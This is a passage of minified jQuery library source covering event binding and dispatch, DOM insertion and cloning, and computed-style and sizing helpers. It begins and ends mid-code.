tmp,events,t,handleObjIn,special,eventHandle,handleObj,handlers,type,namespaces,origType,elemData=jQuery._data(elem);if(elemData){for(handler.handler&&(handler=(handleObjIn=handler).handler,selector=handleObjIn.selector),handler.guid||(handler.guid=jQuery.guid++),(events=elemData.events)||(events=elemData.events={}),(eventHandle=elemData.handle)||(eventHandle=elemData.handle=function(e){return void 0===jQuery||e&&jQuery.event.triggered===e.type?void 0:jQuery.event.dispatch.apply(eventHandle.elem,arguments)},eventHandle.elem=elem),t=(types=(types||"").match(rnotwhite)||[""]).length;t--;)type=origType=(tmp=rtypenamespace.exec(types[t])||[])[1],namespaces=(tmp[2]||"").split(".").sort(),type&&(special=jQuery.event.special[type]||{},type=(selector?special.delegateType:special.bindType)||type,special=jQuery.event.special[type]||{},handleObj=jQuery.extend({type:type,origType:origType,data:data,handler:handler,guid:handler.guid,selector:selector,needsContext:selector&&jQuery.expr.match.needsContext.test(selector),namespace:namespaces.join(".")},handleObjIn),(handlers=events[type])||((handlers=events[type]=[]).delegateCount=0,special.setup&&!1!==special.setup.call(elem,data,namespaces,eventHandle)||(elem.addEventListener?elem.addEventListener(type,eventHandle,!1):elem.attachEvent&&elem.attachEvent("on"+type,eventHandle))),special.add&&(special.add.call(elem,handleObj),handleObj.handler.guid||(handleObj.handler.guid=handler.guid)),selector?handlers.splice(handlers.delegateCount++,0,handleObj):handlers.push(handleObj),jQuery.event.global[type]=!0);elem=null}},remove:function(elem,types,handler,selector,mappedTypes){var j,handleObj,tmp,origCount,t,events,special,handlers,type,namespaces,origType,elemData=jQuery.hasData(elem)&&jQuery._data(elem);if(elemData&&(events=elemData.events)){for(t=(types=(types||"").match(rnotwhite)||[""]).length;t--;)if(type=origType=(tmp=rtypenamespace.exec(types[t])||[])[1],namespaces=(tmp[2]||"").split(".").sort(),type){for(special=jQuery.event.special[type]||{},handlers=events[type=(selector?special.delegateType:special.bindType)||type]||[],tmp=tmp[2]&&new RegExp("(^|\\.)"+namespaces.join("\\.(?:.*\\.|)")+"(\\.|$)"),origCount=j=handlers.length;j--;)handleObj=handlers[j],!mappedTypes&&origType!==handleObj.origType||handler&&handler.guid!==handleObj.guid||tmp&&!tmp.test(handleObj.namespace)||selector&&selector!==handleObj.selector&&("**"!==selector||!handleObj.selector)||(handlers.splice(j,1),handleObj.selector&&handlers.delegateCount--,special.remove&&special.remove.call(elem,handleObj));origCount&&!handlers.length&&(special.teardown&&!1!==special.teardown.call(elem,namespaces,elemData.handle)||jQuery.removeEvent(elem,type,elemData.handle),delete events[type])}else for(type in events)jQuery.event.remove(elem,type+types[t],handler,selector,!0);jQuery.isEmptyObject(events)&&(delete elemData.handle,jQuery._removeData(elem,"events"))}},trigger:function(event,data,elem,onlyHandlers){var handle,ontype,cur,bubbleType,special,tmp,i,eventPath=[elem||document],type=hasOwn.call(event,"type")?event.type:event,namespaces=hasOwn.call(event,"namespace")?event.namespace.split("."):[];if(cur=tmp=elem=elem||document,3!==elem.nodeType&&8!==elem.nodeType&&!rfocusMorph.test(type+jQuery.event.triggered)&&(type.indexOf(".")>-1&&(namespaces=type.split("."),type=namespaces.shift(),namespaces.sort()),ontype=type.indexOf(":")<0&&"on"+type,(event=event[jQuery.expando]?event:new jQuery.Event(type,"object"==typeof event&&event)).isTrigger=onlyHandlers?2:3,event.namespace=namespaces.join("."),event.rnamespace=event.namespace?new RegExp("(^|\\.)"+namespaces.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,event.result=void 0,event.target||(event.target=elem),data=null==data?[event]:jQuery.makeArray(data,[event]),special=jQuery.event.special[type]||{},onlyHandlers||!special.trigger||!1!==special.trigger.apply(elem,data))){if(!onlyHandlers&&!special.noBubble&&!jQuery.isWindow(elem)){for(bubbleType=special.delegateType||type,rfocusMorph.test(bubbleType+type)||(cur=cur.parentNode);cur;cur=cur.parentNode)eventPath.push(cur),tmp=cur;tmp===(elem.ownerDocument||document)&&eventPath.push(tmp.defaultView||tmp.parentWindow||window)}for(i=0;(cur=eventPath[i++])&&!event.isPropagationStopped();)event.type=i>1?bubbleType:special.bindType||type,(handle=(jQuery._data(cur,"events")||{})[event.type]&&jQuery._data(cur,"handle"))&&handle.apply(cur,data),(handle=ontype&&cur[ontype])&&handle.apply&&acceptData(cur)&&(event.result=handle.apply(cur,data),!1===event.result&&event.preventDefault());if(event.type=type,!onlyHandlers&&!event.isDefaultPrevented()&&(!special._default||!1===special._default.apply(eventPath.pop(),data))&&acceptData(elem)&&ontype&&elem[type]&&!jQuery.isWindow(elem)){(tmp=elem[ontype])&&(elem[ontype]=null),jQuery.event.triggered=type;try{elem[type]()}catch(e){}jQuery.event.triggered=void 0,tmp&&(elem[ontype]=tmp)}return event.result}},dispatch:function(event){event=jQuery.event.fix(event);var i,j,ret,matched,handleObj,handlerQueue,args=slice.call(arguments),handlers=(jQuery._data(this,"events")||{})[event.type]||[],special=jQuery.event.special[event.type]||{};if(args[0]=event,event.delegateTarget=this,!special.preDispatch||!1!==special.preDispatch.call(this,event)){for(handlerQueue=jQuery.event.handlers.call(this,event,handlers),i=0;(matched=handlerQueue[i++])&&!event.isPropagationStopped();)for(event.currentTarget=matched.elem,j=0;(handleObj=matched.handlers[j++])&&!event.isImmediatePropagationStopped();)event.rnamespace&&!event.rnamespace.test(handleObj.namespace)||(event.handleObj=handleObj,event.data=handleObj.data,void 0!==(ret=((jQuery.event.special[handleObj.origType]||{}).handle||handleObj.handler).apply(matched.elem,args))&&!1===(event.result=ret)&&(event.preventDefault(),event.stopPropagation()));return special.postDispatch&&special.postDispatch.call(this,event),event.result}},handlers:function(event,handlers){var i,matches,sel,handleObj,handlerQueue=[],delegateCount=handlers.delegateCount,cur=event.target;if(delegateCount&&cur.nodeType&&("click"!==event.type||isNaN(event.button)||event.button<1))for(;cur!=this;cur=cur.parentNode||this)if(1===cur.nodeType&&(!0!==cur.disabled||"click"!==event.type)){for(matches=[],i=0;i<delegateCount;i++)void 0===matches[sel=(handleObj=handlers[i]).selector+" "]&&(matches[sel]=handleObj.needsContext?jQuery(sel,this).index(cur)>-1:jQuery.find(sel,this,null,[cur]).length),matches[sel]&&matches.push(handleObj);matches.length&&handlerQueue.push({elem:cur,handlers:matches})}return delegateCount<handlers.length&&handlerQueue.push({elem:this,handlers:handlers.slice(delegateCount)}),handlerQueue},fix:function(event){if(event[jQuery.expando])return event;var i,prop,copy,type=event.type,originalEvent=event,fixHook=this.fixHooks[type];for(fixHook||(this.fixHooks[type]=fixHook=rmouseEvent.test(type)?this.mouseHooks:rkeyEvent.test(type)?this.keyHooks:{}),copy=fixHook.props?this.props.concat(fixHook.props):this.props,event=new jQuery.Event(originalEvent),i=copy.length;i--;)event[prop=copy[i]]=originalEvent[prop];return event.target||(event.target=originalEvent.srcElement||document),3===event.target.nodeType&&(event.target=event.target.parentNode),event.metaKey=!!event.metaKey,fixHook.filter?fixHook.filter(event,originalEvent):event},props:"altKey bubbles cancelable ctrlKey currentTarget detail eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),fixHooks:{},keyHooks:{props:"char charCode key keyCode".split(" "),filter:function(event,original){return null==event.which&&(event.which=null!=original.charCode?original.charCode:original.keyCode),event}},mouseHooks:{props:"button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),filter:function(event,original){var body,eventDoc,doc,button=original.button,fromElement=original.fromElement;return null==event.pageX&&null!=original.clientX&&(doc=(eventDoc=event.target.ownerDocument||document).documentElement,body=eventDoc.body,event.pageX=original.clientX+(doc&&doc.scrollLeft||body&&body.scrollLeft||0)-(doc&&doc.clientLeft||body&&body.clientLeft||0),event.pageY=original.clientY+(doc&&doc.scrollTop||body&&body.scrollTop||0)-(doc&&doc.clientTop||body&&body.clientTop||0)),!event.relatedTarget&&fromElement&&(event.relatedTarget=fromElement===event.target?original.toElement:fromElement),event.which||void 0===button||(event.which=1&button?1:2&button?3:4&button?2:0),event}},special:{load:{noBubble:!0},focus:{trigger:function(){if(this!==safeActiveElement()&&this.focus)try{return this.focus(),!1}catch(e){}},delegateType:"focusin"},blur:{trigger:function(){if(this===safeActiveElement()&&this.blur)return this.blur(),!1},delegateType:"focusout"},click:{trigger:function(){if(jQuery.nodeName(this,"input")&&"checkbox"===this.type&&this.click)return this.click(),!1},_default:function(event){return jQuery.nodeName(event.target,"a")}},beforeunload:{postDispatch:function(event){void 0!==event.result&&event.originalEvent&&(event.originalEvent.returnValue=event.result)}}},simulate:function(type,elem,event){var e=jQuery.extend(new jQuery.Event,event,{type:type,isSimulated:!0});jQuery.event.trigger(e,null,elem),e.isDefaultPrevented()&&event.preventDefault()}},jQuery.removeEvent=document.removeEventListener?function(elem,type,handle){elem.removeEventListener&&elem.removeEventListener(type,handle)}:function(elem,type,handle){var name="on"+type;elem.detachEvent&&(void 0===elem[name]&&(elem[name]=null),elem.detachEvent(name,handle))},jQuery.Event=function(src,props){if(!(this instanceof jQuery.Event))return new jQuery.Event(src,props);src&&src.type?(this.originalEvent=src,this.type=src.type,this.isDefaultPrevented=src.defaultPrevented||void 0===src.defaultPrevented&&!1===src.returnValue?returnTrue:returnFalse):this.type=src,props&&jQuery.extend(this,props),this.timeStamp=src&&src.timeStamp||jQuery.now(),this[jQuery.expando]=!0},jQuery.Event.prototype={constructor:jQuery.Event,isDefaultPrevented:returnFalse,isPropagationStopped:returnFalse,isImmediatePropagationStopped:returnFalse,preventDefault:function(){var e=this.originalEvent;this.isDefaultPrevented=returnTrue,e&&(e.preventDefault?e.preventDefault():e.returnValue=!1)},stopPropagation:function(){var e=this.originalEvent;this.isPropagationStopped=returnTrue,e&&!this.isSimulated&&(e.stopPropagation&&e.stopPropagation(),e.cancelBubble=!0)},stopImmediatePropagation:function(){var e=this.originalEvent;this.isImmediatePropagationStopped=returnTrue,e&&e.stopImmediatePropagation&&e.stopImmediatePropagation(),this.stopPropagation()}},jQuery.each({mouseenter:"mouseover",mouseleave:"mouseout",pointerenter:"pointerover",pointerleave:"pointerout"},(function(orig,fix){jQuery.event.special[orig]={delegateType:fix,bindType:fix,handle:function(event){var ret,related=event.relatedTarget,handleObj=event.handleObj;return related&&(related===this||jQuery.contains(this,related))||(event.type=handleObj.origType,ret=handleObj.handler.apply(this,arguments),event.type=fix),ret}}})),support.submit||(jQuery.event.special.submit={setup:function(){if(jQuery.nodeName(this,"form"))return!1;jQuery.event.add(this,"click._submit keypress._submit",(function(e){var elem=e.target,form=jQuery.nodeName(elem,"input")||jQuery.nodeName(elem,"button")?jQuery.prop(elem,"form"):void 0;form&&!jQuery._data(form,"submit")&&(jQuery.event.add(form,"submit._submit",(function(event){event._submitBubble=!0})),jQuery._data(form,"submit",!0))}))},postDispatch:function(event){event._submitBubble&&(delete event._submitBubble,this.parentNode&&!event.isTrigger&&jQuery.event.simulate("submit",this.parentNode,event))},teardown:function(){if(jQuery.nodeName(this,"form"))return!1;jQuery.event.remove(this,"._submit")}}),support.change||(jQuery.event.special.change={setup:function(){if(rformElems.test(this.nodeName))return"checkbox"!==this.type&&"radio"!==this.type||(jQuery.event.add(this,"propertychange._change",(function(event){"checked"===event.originalEvent.propertyName&&(this._justChanged=!0)})),jQuery.event.add(this,"click._change",(function(event){this._justChanged&&!event.isTrigger&&(this._justChanged=!1),jQuery.event.simulate("change",this,event)}))),!1;jQuery.event.add(this,"beforeactivate._change",(function(e){var elem=e.target;rformElems.test(elem.nodeName)&&!jQuery._data(elem,"change")&&(jQuery.event.add(elem,"change._change",(function(event){!this.parentNode||event.isSimulated||event.isTrigger||jQuery.event.simulate("change",this.parentNode,event)})),jQuery._data(elem,"change",!0))}))},handle:function(event){var elem=event.target;if(this!==elem||event.isSimulated||event.isTrigger||"radio"!==elem.type&&"checkbox"!==elem.type)return event.handleObj.handler.apply(this,arguments)},teardown:function(){return jQuery.event.remove(this,"._change"),!rformElems.test(this.nodeName)}}),support.focusin||jQuery.each({focus:"focusin",blur:"focusout"},(function(orig,fix){var handler=function(event){jQuery.event.simulate(fix,event.target,jQuery.event.fix(event))};jQuery.event.special[fix]={setup:function(){var doc=this.ownerDocument||this,attaches=jQuery._data(doc,fix);attaches||doc.addEventListener(orig,handler,!0),jQuery._data(doc,fix,(attaches||0)+1)},teardown:function(){var doc=this.ownerDocument||this,attaches=jQuery._data(doc,fix)-1;attaches?jQuery._data(doc,fix,attaches):(doc.removeEventListener(orig,handler,!0),jQuery._removeData(doc,fix))}}})),jQuery.fn.extend({on:function(types,selector,data,fn){return on(this,types,selector,data,fn)},one:function(types,selector,data,fn){return on(this,types,selector,data,fn,1)},off:function(types,selector,fn){var handleObj,type;if(types&&types.preventDefault&&types.handleObj)return handleObj=types.handleObj,jQuery(types.delegateTarget).off(handleObj.namespace?handleObj.origType+"."+handleObj.namespace:handleObj.origType,handleObj.selector,handleObj.handler),this;if("object"==typeof types){for(type in types)this.off(type,selector,types[type]);return this}return!1!==selector&&"function"!=typeof selector||(fn=selector,selector=void 0),!1===fn&&(fn=returnFalse),this.each((function(){jQuery.event.remove(this,types,fn,selector)}))},trigger:function(type,data){return this.each((function(){jQuery.event.trigger(type,data,this)}))},triggerHandler:function(type,data){var elem=this[0];if(elem)return jQuery.event.trigger(type,data,elem,!0)}});var rinlinejQuery=/ jQuery\d+="(?:null|\d+)"/g,rnoshimcache=new RegExp("<(?:"+nodeNames+")[\\s/>]","i"),rxhtmlTag=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:-]+)[^>]*)\/>/gi,rnoInnerhtml=/<script|<style|<link/i,rchecked=/checked\s*(?:[^=]|=\s*.checked.)/i,rscriptTypeMasked=/^true\/(.*)/,rcleanScript=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,fragmentDiv=createSafeFragment(document).appendChild(document.createElement("div"));function manipulationTarget(elem,content){return jQuery.nodeName(elem,"table")&&jQuery.nodeName(11!==content.nodeType?content:content.firstChild,"tr")?elem.getElementsByTagName("tbody")[0]||elem.appendChild(elem.ownerDocument.createElement("tbody")):elem}function disableScript(elem){return elem.type=(null!==jQuery.find.attr(elem,"type"))+"/"+elem.type,elem}function restoreScript(elem){var match=rscriptTypeMasked.exec(elem.type);return match?elem.type=match[1]:elem.removeAttribute("type"),elem}function cloneCopyEvent(src,dest){if(1===dest.nodeType&&jQuery.hasData(src)){var type,i,l,oldData=jQuery._data(src),curData=jQuery._data(dest,oldData),events=oldData.events;if(events)for(type in delete curData.handle,curData.events={},events)for(i=0,l=events[type].length;i<l;i++)jQuery.event.add(dest,type,events[type][i]);curData.data&&(curData.data=jQuery.extend({},curData.data))}}function fixCloneNodeIssues(src,dest){var nodeName,e,data;if(1===dest.nodeType){if(nodeName=dest.nodeName.toLowerCase(),!support.noCloneEvent&&dest[jQuery.expando]){for(e in(data=jQuery._data(dest)).events)jQuery.removeEvent(dest,e,data.handle);dest.removeAttribute(jQuery.expando)}"script"===nodeName&&dest.text!==src.text?(disableScript(dest).text=src.text,restoreScript(dest)):"object"===nodeName?(dest.parentNode&&(dest.outerHTML=src.outerHTML),support.html5Clone&&src.innerHTML&&!jQuery.trim(dest.innerHTML)&&(dest.innerHTML=src.innerHTML)):"input"===nodeName&&rcheckableType.test(src.type)?(dest.defaultChecked=dest.checked=src.checked,dest.value!==src.value&&(dest.value=src.value)):"option"===nodeName?dest.defaultSelected=dest.selected=src.defaultSelected:"input"!==nodeName&&"textarea"!==nodeName||(dest.defaultValue=src.defaultValue)}}function domManip(collection,args,callback,ignored){args=concat.apply([],args);var first,node,hasScripts,scripts,doc,fragment,i=0,l=collection.length,iNoClone=l-1,value=args[0],isFunction=jQuery.isFunction(value);if(isFunction||l>1&&"string"==typeof value&&!support.checkClone&&rchecked.test(value))return collection.each((function(index){var self=collection.eq(index);isFunction&&(args[0]=value.call(this,index,self.html())),domManip(self,args,callback,ignored)}));if(l&&(first=(fragment=buildFragment(args,collection[0].ownerDocument,!1,collection,ignored)).firstChild,1===fragment.childNodes.length&&(fragment=first),first||ignored)){for(hasScripts=(scripts=jQuery.map(getAll(fragment,"script"),disableScript)).length;i<l;i++)node=fragment,i!==iNoClone&&(node=jQuery.clone(node,!0,!0),hasScripts&&jQuery.merge(scripts,getAll(node,"script"))),callback.call(collection[i],node,i);if(hasScripts)for(doc=scripts[scripts.length-1].ownerDocument,jQuery.map(scripts,restoreScript),i=0;i<hasScripts;i++)node=scripts[i],rscriptType.test(node.type||"")&&!jQuery._data(node,"globalEval")&&jQuery.contains(doc,node)&&(node.src?jQuery._evalUrl&&jQuery._evalUrl(node.src):jQuery.globalEval((node.text||node.textContent||node.innerHTML||"").replace(rcleanScript,"")));fragment=first=null}return collection}function remove(elem,selector,keepData){for(var node,elems=selector?jQuery.filter(selector,elem):elem,i=0;null!=(node=elems[i]);i++)keepData||1!==node.nodeType||jQuery.cleanData(getAll(node)),node.parentNode&&(keepData&&jQuery.contains(node.ownerDocument,node)&&setGlobalEval(getAll(node,"script")),node.parentNode.removeChild(node));return elem}jQuery.extend({htmlPrefilter:function(html){return html.replace(rxhtmlTag,"<$1></$2>")},clone:function(elem,dataAndEvents,deepDataAndEvents){var destElements,node,clone,i,srcElements,inPage=jQuery.contains(elem.ownerDocument,elem);if(support.html5Clone||jQuery.isXMLDoc(elem)||!rnoshimcache.test("<"+elem.nodeName+">")?clone=elem.cloneNode(!0):(fragmentDiv.innerHTML=elem.outerHTML,fragmentDiv.removeChild(clone=fragmentDiv.firstChild)),!(support.noCloneEvent&&support.noCloneChecked||1!==elem.nodeType&&11!==elem.nodeType||jQuery.isXMLDoc(elem)))for(destElements=getAll(clone),srcElements=getAll(elem),i=0;null!=(node=srcElements[i]);++i)destElements[i]&&fixCloneNodeIssues(node,destElements[i]);if(dataAndEvents)if(deepDataAndEvents)for(srcElements=srcElements||getAll(elem),destElements=destElements||getAll(clone),i=0;null!=(node=srcElements[i]);i++)cloneCopyEvent(node,destElements[i]);else cloneCopyEvent(elem,clone);return(destElements=getAll(clone,"script")).length>0&&setGlobalEval(destElements,!inPage&&getAll(elem,"script")),destElements=srcElements=node=null,clone},cleanData:function(elems,forceAcceptData){for(var elem,type,id,data,i=0,internalKey=jQuery.expando,cache=jQuery.cache,attributes=support.attributes,special=jQuery.event.special;null!=(elem=elems[i]);i++)if((forceAcceptData||acceptData(elem))&&(data=(id=elem[internalKey])&&cache[id])){if(data.events)for(type in data.events)special[type]?jQuery.event.remove(elem,type):jQuery.removeEvent(elem,type,data.handle);cache[id]&&(delete cache[id],attributes||void 0===elem.removeAttribute?elem[internalKey]=void 0:elem.removeAttribute(internalKey),deletedIds.push(id))}}}),jQuery.fn.extend({domManip:domManip,detach:function(selector){return remove(this,selector,!0)},remove:function(selector){return remove(this,selector)},text:function(value){return access(this,(function(value){return void 0===value?jQuery.text(this):this.empty().append((this[0]&&this[0].ownerDocument||document).createTextNode(value))}),null,value,arguments.length)},append:function(){return domManip(this,arguments,(function(elem){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||manipulationTarget(this,elem).appendChild(elem)}))},prepend:function(){return domManip(this,arguments,(function(elem){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var target=manipulationTarget(this,elem);target.insertBefore(elem,target.firstChild)}}))},before:function(){return domManip(this,arguments,(function(elem){this.parentNode&&this.parentNode.insertBefore(elem,this)}))},after:function(){return domManip(this,arguments,(function(elem){this.parentNode&&this.parentNode.insertBefore(elem,this.nextSibling)}))},empty:function(){for(var elem,i=0;null!=(elem=this[i]);i++){for(1===elem.nodeType&&jQuery.cleanData(getAll(elem,!1));elem.firstChild;)elem.removeChild(elem.firstChild);elem.options&&jQuery.nodeName(elem,"select")&&(elem.options.length=0)}return this},clone:function(dataAndEvents,deepDataAndEvents){return dataAndEvents=null!=dataAndEvents&&dataAndEvents,deepDataAndEvents=null==deepDataAndEvents?dataAndEvents:deepDataAndEvents,this.map((function(){return jQuery.clone(this,dataAndEvents,deepDataAndEvents)}))},html:function(value){return access(this,(function(value){var elem=this[0]||{},i=0,l=this.length;if(void 0===value)return 1===elem.nodeType?elem.innerHTML.replace(rinlinejQuery,""):void 0;if("string"==typeof value&&!rnoInnerhtml.test(value)&&(support.htmlSerialize||!rnoshimcache.test(value))&&(support.leadingWhitespace||!rleadingWhitespace.test(value))&&!wrapMap[(rtagName.exec(value)||["",""])[1].toLowerCase()]){value=jQuery.htmlPrefilter(value);try{for(;i<l;i++)1===(elem=this[i]||{}).nodeType&&(jQuery.cleanData(getAll(elem,!1)),elem.innerHTML=value);elem=0}catch(e){}}elem&&this.empty().append(value)}),null,value,arguments.length)},replaceWith:function(){var ignored=[];return domManip(this,arguments,(function(elem){var parent=this.parentNode;jQuery.inArray(this,ignored)<0&&(jQuery.cleanData(getAll(this)),parent&&parent.replaceChild(elem,this))}),ignored)}}),jQuery.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},(function(name,original){jQuery.fn[name]=function(selector){for(var elems,i=0,ret=[],insert=jQuery(selector),last=insert.length-1;i<=last;i++)elems=i===last?this:this.clone(!0),jQuery(insert[i])[original](elems),push.apply(ret,elems.get());return this.pushStack(ret)}}));var iframe,elemdisplay={HTML:"block",BODY:"block"};function actualDisplay(name,doc){var elem=jQuery(doc.createElement(name)).appendTo(doc.body),display=jQuery.css(elem[0],"display");return elem.detach(),display}function defaultDisplay(nodeName){var doc=document,display=elemdisplay[nodeName];return display||("none"!==(display=actualDisplay(nodeName,doc))&&display||((doc=((iframe=(iframe||jQuery("<iframe frameborder='0' width='0' height='0'/>")).appendTo(doc.documentElement))[0].contentWindow||iframe[0].contentDocument).document).write(),doc.close(),display=actualDisplay(nodeName,doc),iframe.detach()),elemdisplay[nodeName]=display),display}var rmargin=/^margin/,rnumnonpx=new RegExp("^("+pnum+")(?!px)[a-z%]+$","i"),swap=function(elem,options,callback,args){var ret,name,old={};for(name in options)old[name]=elem.style[name],elem.style[name]=options[name];for(name in ret=callback.apply(elem,args||[]),options)elem.style[name]=old[name];return ret},documentElement=document.documentElement;!function(){var pixelPositionVal,pixelMarginRightVal,boxSizingReliableVal,reliableHiddenOffsetsVal,reliableMarginRightVal,reliableMarginLeftVal,container=document.createElement("div"),div=document.createElement("div");function computeStyleTests(){var contents,divStyle,documentElement=document.documentElement;documentElement.appendChild(container),div.style.cssText="-webkit-box-sizing:border-box;box-sizing:border-box;position:relative;display:block;margin:auto;border:1px;padding:1px;top:1%;width:50%",pixelPositionVal=boxSizingReliableVal=reliableMarginLeftVal=!1,pixelMarginRightVal=reliableMarginRightVal=!0,window.getComputedStyle&&(divStyle=window.getComputedStyle(div),pixelPositionVal="1%"!==(divStyle||{}).top,reliableMarginLeftVal="2px"===(divStyle||{}).marginLeft,boxSizingReliableVal="4px"===(divStyle||{width:"4px"}).width,div.style.marginRight="50%",pixelMarginRightVal="4px"===(divStyle||{marginRight:"4px"}).marginRight,(contents=div.appendChild(document.createElement("div"))).style.cssText=div.style.cssText="-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:0",contents.style.marginRight=contents.style.width="0",div.style.width="1px",reliableMarginRightVal=!parseFloat((window.getComputedStyle(contents)||{}).marginRight),div.removeChild(contents)),div.style.display="none",(reliableHiddenOffsetsVal=0===div.getClientRects().length)&&(div.style.display="",div.innerHTML="<table><tr><td></td><td>t</td></tr></table>",div.childNodes[0].style.borderCollapse="separate",(contents=div.getElementsByTagName("td"))[0].style.cssText="margin:0;border:0;padding:0;display:none",(reliableHiddenOffsetsVal=0===contents[0].offsetHeight)&&(contents[0].style.display="",contents[1].style.display="none",reliableHiddenOffsetsVal=0===contents[0].offsetHeight)),documentElement.removeChild(container)}div.style&&(div.style.cssText="float:left;opacity:.5",support.opacity="0.5"===div.style.opacity,support.cssFloat=!!div.style.cssFloat,div.style.backgroundClip="content-box",div.cloneNode(!0).style.backgroundClip="",support.clearCloneStyle="content-box"===div.style.backgroundClip,(container=document.createElement("div")).style.cssText="border:0;width:8px;height:0;top:0;left:-9999px;padding:0;margin-top:1px;position:absolute",div.innerHTML="",container.appendChild(div),support.boxSizing=""===div.style.boxSizing||""===div.style.MozBoxSizing||""===div.style.WebkitBoxSizing,jQuery.extend(support,{reliableHiddenOffsets:function(){return null==pixelPositionVal&&computeStyleTests(),reliableHiddenOffsetsVal},boxSizingReliable:function(){return null==pixelPositionVal&&computeStyleTests(),boxSizingReliableVal},pixelMarginRight:function(){return null==pixelPositionVal&&computeStyleTests(),pixelMarginRightVal},pixelPosition:function(){return null==pixelPositionVal&&computeStyleTests(),pixelPositionVal},reliableMarginRight:function(){return null==pixelPositionVal&&computeStyleTests(),reliableMarginRightVal},reliableMarginLeft:function(){return null==pixelPositionVal&&computeStyleTests(),reliableMarginLeftVal}}))}();var getStyles,curCSS,rposition=/^(top|right|bottom|left)$/;function addGetHookIf(conditionFn,hookFn){return{get:function(){if(!conditionFn())return(this.get=hookFn).apply(this,arguments);delete this.get}}}window.getComputedStyle?(getStyles=function(elem){var view=elem.ownerDocument.defaultView;return view&&view.opener||(view=window),view.getComputedStyle(elem)},curCSS=function(elem,name,computed){var width,minWidth,maxWidth,ret,style=elem.style;return""!==(ret=(computed=computed||getStyles(elem))?computed.getPropertyValue(name)||computed[name]:void 0)&&void 0!==ret||jQuery.contains(elem.ownerDocument,elem)||(ret=jQuery.style(elem,name)),computed&&!support.pixelMarginRight()&&rnumnonpx.test(ret)&&rmargin.test(name)&&(width=style.width,minWidth=style.minWidth,maxWidth=style.maxWidth,style.minWidth=style.maxWidth=style.width=ret,ret=computed.width,style.width=width,style.minWidth=minWidth,style.maxWidth=maxWidth),void 0===ret?ret:ret+""}):documentElement.currentStyle&&(getStyles=function(elem){return elem.currentStyle},curCSS=function(elem,name,computed){var left,rs,rsLeft,ret,style=elem.style;return null==(ret=(computed=computed||getStyles(elem))?computed[name]:void 0)&&style&&style[name]&&(ret=style[name]),rnumnonpx.test(ret)&&!rposition.test(name)&&(left=style.left,(rsLeft=(rs=elem.runtimeStyle)&&rs.left)&&(rs.left=elem.currentStyle.left),style.left="fontSize"===name?"1em":ret,ret=style.pixelLeft+"px",style.left=left,rsLeft&&(rs.left=rsLeft)),void 0===ret?ret:ret+""||"auto"});var ralpha=/alpha\([^)]*\)/i,ropacity=/opacity\s*=\s*([^)]*)/i,rdisplayswap=/^(none|table(?!-c[ea]).+)/,rnumsplit=new RegExp("^("+pnum+")(.*)$","i"),cssShow={position:"absolute",visibility:"hidden",display:"block"},cssNormalTransform={letterSpacing:"0",fontWeight:"400"},cssPrefixes=["Webkit","O","Moz","ms"],emptyStyle=document.createElement("div").style;function vendorPropName(name){if(name in emptyStyle)return name;for(var capName=name.charAt(0).toUpperCase()+name.slice(1),i=cssPrefixes.length;i--;)if((name=cssPrefixes[i]+capName)in emptyStyle)return name}function showHide(elements,show){for(var display,elem,hidden,values=[],index=0,length=elements.length;index<length;index++)(elem=elements[index]).style&&(values[index]=jQuery._data(elem,"olddisplay"),display=elem.style.display,show?(values[index]||"none"!==display||(elem.style.display=""),""===elem.style.display&&isHidden(elem)&&(values[index]=jQuery._data(elem,"olddisplay",defaultDisplay(elem.nodeName)))):(hidden=isHidden(elem),(display&&"none"!==display||!hidden)&&jQuery._data(elem,"olddisplay",hidden?display:jQuery.css(elem,"display"))));for(index=0;index<length;index++)(elem=elements[index]).style&&(show&&"none"!==elem.style.display&&""!==elem.style.display||(elem.style.display=show?values[index]||"":"none"));return elements}function setPositiveNumber(elem,value,subtract){var matches=rnumsplit.exec(value);return matches?Math.max(0,matches[1]-(subtract||0))+(matches[2]||"px"):value}function augmentWidthOrHeight(elem,name,extra,isBorderBox,styles){for(var i=extra===(isBorderBox?"border":"content")?4:"width"===name?1:0,val=0;i<4;i+=2)"margin"===extra&&(val+=jQuery.css(elem,extra+cssExpand[i],!0,styles)),isBorderBox?("content"===extra&&(val-=jQuery.css(elem,"padding"+cssExpand[i],!0,styles)),"margin"!==extra&&(val-=jQuery.css(elem,"border"+cssExpand[i]+"Width",!0,styles))):(val+=jQuery.css(elem,"padding"+cssExpand[i],!0,styles),"padding"!==extra&&(val+=jQuery.css(elem,"border"+cssExpand[i]+"Width",!0,styles)));return val}function getWidthOrHeight(elem,name,extra){var valueIsBorderBox=!0,val="width"===name?elem.offsetWidth:elem.offsetHeight,styles=getStyles(elem),isBorderBox=support.boxSizing&&"border-box"===jQuery.css(elem,"boxSizing",!1,styles);if(val<=0||null==val){if(((val=curCSS(elem,name,styles))<0||null==val)&&(val=elem.style[name]),rnumnonpx.test(val))return val;valueIsBorderBox=isBorderBox&&(support.boxSizingReliable()||val===elem.style[name]),val=parseFloat(val)||0}return val+augmentWidthOrHeight(elem,name,extra||(isBorderBox?"border":"content"),valueIsBorderBox,styles)+"px"}function Tween(elem,options,prop,end,easing){return new Tween.prototype.init(elem,options,prop,end,easing)}jQuery.extend({cssHooks:{opacity:{get:function(elem,computed){if(computed){var ret=curCSS(elem,"opacity");return""===ret?"1":ret}}}},cssNumber:{animationIterationCount:!0,columnCount:!0,fillOpacity:!0,flexGrow:!0,flexShrink:!0,fontWeight:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{float:support.cssFloat?"cssFloat":"styleFloat"},style:function(elem,name,value,extra){if(elem&&3!==elem.nodeType&&8!==elem.nodeType&&elem.style){var ret,type,hooks,origName=jQuery.camelCase(name),style=elem.style;if(name=jQuery.cssProps[origName]||(jQuery.cssProps[origName]=vendorPropName(origName)||origName),hooks=jQuery.cssHooks[name]||jQuery.cssHooks[origName],void 0===value)return hooks&&"get"in hooks&&void 